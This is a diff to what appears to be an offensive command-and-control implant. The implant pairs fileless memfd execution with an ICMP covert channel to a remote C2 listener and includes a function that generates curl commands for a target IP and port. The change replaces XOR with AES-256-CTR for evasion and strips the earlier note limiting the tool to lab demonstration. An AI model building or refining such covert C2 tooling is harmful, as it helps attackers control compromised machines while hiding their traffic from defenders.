@@ -42,20 +42,21 @@ Why fork() is needed:
   - The child's memfd fd is a duplicate (fork copies the fd table), so the
     memfd remains valid even after the parent closes it.
 
-PRINCIPLE 2 — XOR Encryption
------------------------------
-XOR cipher: ciphertext[i] = plaintext[i] ^ key[i % len(key)]
+PRINCIPLE 2 — AES-256-CTR Encryption via OpenSSL
+--------------------------------------------------
+AES-256-CTR (Counter mode) is a NIST-standardized symmetric cipher.
+Implementation uses ctypes to call system OpenSSL libcrypto directly,
+avoiding any pip dependencies while achieving industry-standard strength.
 
 Properties:
-  + Symmetric: same operation encrypts and decrypts
-  + Zero dependencies: no crypto library needed
-  + Fast: single CPU instruction per byte
-  - Vulnerable to known-plaintext attack: if attacker knows any plaintext
-    byte, they recover the corresponding key byte
-  - Key reuse: identical key + identical plaintext → identical ciphertext
-    (no IV/nonce, unlike AES-CTR or ChaCha20)
-  - NOT cryptographically secure for real operations; sufficient for lab
-    demonstration of the *concept* of encrypted C2
+  + Semantic security: random IV per packet prevents pattern analysis
+  + No padding: ciphertext length = plaintext length (ideal for ICMP)
+  + Industry standard: AES-256 with 2^256 key space
+  + Zero pip dependencies: uses system libcrypto via ctypes
+  - Requires OpenSSL on target (pre-installed on all Linux distros)
+
+Key derivation: AES_KEY = SHA-256(SHARED_SECRET) → 32 bytes
+Per-packet: IV = os.urandom(16), prepended to ciphertext
 
 PRINCIPLE 3 — ICMP Covert Channel
 -----------------------------------
@@ -83,7 +84,7 @@ Our protocol over ICMP:
   │                 │ type=8 code=0    │ ┌────────��────┐│
   │                 │ checksum         │ │ MAGIC (1B)  ││
   │                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
-  │                 │ SEQ              │ │ XOR data    ││
+  │                 │ SEQ              │ │ IV+AES data ││
   │                 │                  │ └─────────────┘│
   └──────────────────────────────────────────────────────┘
 
@@ -367,7 +368,7 @@ def build_icmp_packet(msg_type: int, payload: bytes, seq: int) -> bytes:
       Bytes 2-3: Checksum (computed over entire ICMP message)
       Bytes 4-5: Identifier (ICMP_ID = 0x1337, our C2 marker)
       Bytes 6-7: Sequence number
-      Bytes 8+ : Data payload = [MAGIC][msg_type][XOR-encrypted data]
+      Bytes 8+ : Data payload = [MAGIC][msg_type][IV(16B)][AES-CTR data]
 
     The checksum must be computed with the checksum field set to zero,
     then patched back into the header.  This is the standard ICMP procedure.
@@ -500,7 +501,7 @@ def generate_curl_command(target_ip: str, target_port: int,
 #
 #  The listener captures ALL incoming ICMP packets on the raw
 #  socket, filters for our protocol (ID + MAGIC), decrypts the
-#  XOR payload, and dispatches based on message type.
+#  AES-decrypted payload, and dispatches based on message type.
 #
 #  Packet flow:
 #    Agent → [ICMP type 8, ID 0x1337] → C2 raw socket
